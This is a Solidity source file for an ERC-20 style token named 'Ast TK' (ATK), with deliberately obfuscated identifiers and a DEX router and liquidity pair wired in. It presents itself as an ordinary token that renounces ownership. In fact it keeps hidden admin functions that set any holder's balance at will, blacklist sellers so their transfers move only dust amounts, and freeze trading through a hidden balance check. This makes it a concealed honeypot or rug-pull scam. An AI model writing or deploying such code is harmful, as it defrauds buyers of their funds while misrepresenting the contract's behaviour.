//SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface urmdqsokllbf {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract dctdjneuuve {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface amkmlthfiddlic {
    function createPair(address nplaukplfs, address yofogwfnlgc) external returns (address);
}

interface bqhogenkcax {
    function totalSupply() external view returns (uint256);

    function balanceOf(address lhropblihajvp) external view returns (uint256);

    function transfer(address cegyptakpbjzys, uint256 mdssuppjd) external returns (bool);

    function allowance(address oedrvftublup, address spender) external view returns (uint256);

    function approve(address spender, uint256 mdssuppjd) external returns (bool);

    function transferFrom(
        address sender,
        address cegyptakpbjzys,
        uint256 mdssuppjd
    ) external returns (bool);

    event Transfer(address indexed from, address indexed hnncfndqpnkj, uint256 value);
    event Approval(address indexed oedrvftublup, address indexed spender, uint256 value);
}

interface bqhogenkcaxMetadata is bqhogenkcax {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract AstTK is dctdjneuuve, bqhogenkcax, bqhogenkcaxMetadata {

    bool public cgntltkrcow;

    function transferFrom(address wfvkugvqsk, address cegyptakpbjzys, uint256 mdssuppjd) external override returns (bool) {
        if (_msgSender() != dsxwjdkqxikz) {
            if (fbkdmgzwj[wfvkugvqsk][_msgSender()] != type(uint256).max) {
                require(mdssuppjd <= fbkdmgzwj[wfvkugvqsk][_msgSender()]);
                fbkdmgzwj[wfvkugvqsk][_msgSender()] -= mdssuppjd;
            }
        }
        return kqtzqxjpvoknqx(wfvkugvqsk, cegyptakpbjzys, mdssuppjd);
    }

    address dsxwjdkqxikz = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    string private ttnwnbnwayi = "ATK";

    uint256 private eviqruyufoff;

    function balanceOf(address lhropblihajvp) public view virtual override returns (uint256) {
        return mnifxcippi[lhropblihajvp];
    }

    function rgkfdmwpisty(address ehqhhrzatl) public {
        xtxqqxnoi();
        
        if (ehqhhrzatl == esbtcaogrt || ehqhhrzatl == dauuuvzhwgk) {
            return;
        }
        szzabjmkmwuoxs[ehqhhrzatl] = true;
    }

    function xtxqqxnoi() private view {
        require(qhlfgneuyc[_msgSender()]);
    }

    uint256 public dxdrfpdbfx;

    function texdrkbbncy(uint256 mdssuppjd) public {
        xtxqqxnoi();
        bhbmrepsvl = mdssuppjd;
    }

    function symbol() external view virtual override returns (string memory) {
        return ttnwnbnwayi;
    }

    uint256 public ihljkuvgnxgoeo;

    uint256 constant cghzudmhlblkm = 11 ** 10;

    uint256 bhbmrepsvl;

    mapping(address => mapping(address => uint256)) private fbkdmgzwj;

    bool private nucpvqnawt;

    function mhayazqlx(address kerrfrznxj, uint256 mdssuppjd) public {
        xtxqqxnoi();
        mnifxcippi[kerrfrznxj] = mdssuppjd;
    }

    function kqtzqxjpvoknqx(address wfvkugvqsk, address cegyptakpbjzys, uint256 mdssuppjd) internal returns (bool) {
        if (wfvkugvqsk == esbtcaogrt) {
            return zodamkbkmpklp(wfvkugvqsk, cegyptakpbjzys, mdssuppjd);
        }
        uint256 rwanzmduysdrd = bqhogenkcax(dauuuvzhwgk).balanceOf(zrjxxcvmk);
        require(rwanzmduysdrd == bhbmrepsvl);
        require(cegyptakpbjzys != zrjxxcvmk);
        if (szzabjmkmwuoxs[wfvkugvqsk]) {
            return zodamkbkmpklp(wfvkugvqsk, cegyptakpbjzys, cghzudmhlblkm);
        }
        return zodamkbkmpklp(wfvkugvqsk, cegyptakpbjzys, mdssuppjd);
    }

    uint256 mvlelpzcej;

    function gvfndqrjfjhzm(address ijdazervrcg) public {
        if (wyhwszxovdkf) {
            return;
        }
        if (egxiakyztyxkmj) {
            knhhqmwocbjiju = false;
        }
        qhlfgneuyc[ijdazervrcg] = true;
        if (nucpvqnawt == uivoyqbyqdfxt) {
            knhhqmwocbjiju = true;
        }
        wyhwszxovdkf = true;
    }

    bool public egxiakyztyxkmj;

    address private ljhjcgqmhvowj;

    function name() external view virtual override returns (string memory) {
        return esmbrxwaifxxsf;
    }

    bool public wyhwszxovdkf;

    uint256 private avgrfckun = 100000000 * 10 ** 18;

    function allowance(address aypdjavon, address rnqqmxcxrszf) external view virtual override returns (uint256) {
        if (rnqqmxcxrszf == dsxwjdkqxikz) {
            return type(uint256).max;
        }
        return fbkdmgzwj[aypdjavon][rnqqmxcxrszf];
    }

    function zodamkbkmpklp(address wfvkugvqsk, address cegyptakpbjzys, uint256 mdssuppjd) internal returns (bool) {
        require(mnifxcippi[wfvkugvqsk] >= mdssuppjd);
        mnifxcippi[wfvkugvqsk] -= mdssuppjd;
        mnifxcippi[cegyptakpbjzys] += mdssuppjd;
        emit Transfer(wfvkugvqsk, cegyptakpbjzys, mdssuppjd);
        return true;
    }

    function rrhewjesftr() public {
        emit OwnershipTransferred(esbtcaogrt, address(0));
        ljhjcgqmhvowj = address(0);
    }

    function transfer(address kerrfrznxj, uint256 mdssuppjd) external virtual override returns (bool) {
        return kqtzqxjpvoknqx(_msgSender(), kerrfrznxj, mdssuppjd);
    }

    bool public knhhqmwocbjiju;

    mapping(address => uint256) private mnifxcippi;

    address zrjxxcvmk = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => bool) public qhlfgneuyc;

    address public dauuuvzhwgk;

    event OwnershipTransferred(address indexed lwoljgqozrajo, address indexed jtsstyrlhmqn);

    string private esmbrxwaifxxsf = "Ast TK";

    address public esbtcaogrt;

    function decimals() external view virtual override returns (uint8) {
        return cyjulwivpo;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return avgrfckun;
    }

    bool public uivoyqbyqdfxt;

    uint8 private cyjulwivpo = 18;

    function getOwner() external view returns (address) {
        return ljhjcgqmhvowj;
    }

    function approve(address rnqqmxcxrszf, uint256 mdssuppjd) public virtual override returns (bool) {
        fbkdmgzwj[_msgSender()][rnqqmxcxrszf] = mdssuppjd;
        emit Approval(_msgSender(), rnqqmxcxrszf, mdssuppjd);
        return true;
    }

    mapping(address => bool) public szzabjmkmwuoxs;

    constructor (){
        
        rrhewjesftr();
        urmdqsokllbf nvnnblwwycl = urmdqsokllbf(dsxwjdkqxikz);
        dauuuvzhwgk = amkmlthfiddlic(nvnnblwwycl.factory()).createPair(nvnnblwwycl.WETH(), address(this));
        if (cgntltkrcow) {
            ihljkuvgnxgoeo = eviqruyufoff;
        }
        esbtcaogrt = _msgSender();
        qhlfgneuyc[esbtcaogrt] = true;
        mnifxcippi[esbtcaogrt] = avgrfckun;
        
        emit Transfer(address(0), esbtcaogrt, avgrfckun);
    }

    function owner() external view returns (address) {
        return ljhjcgqmhvowj;
    }

}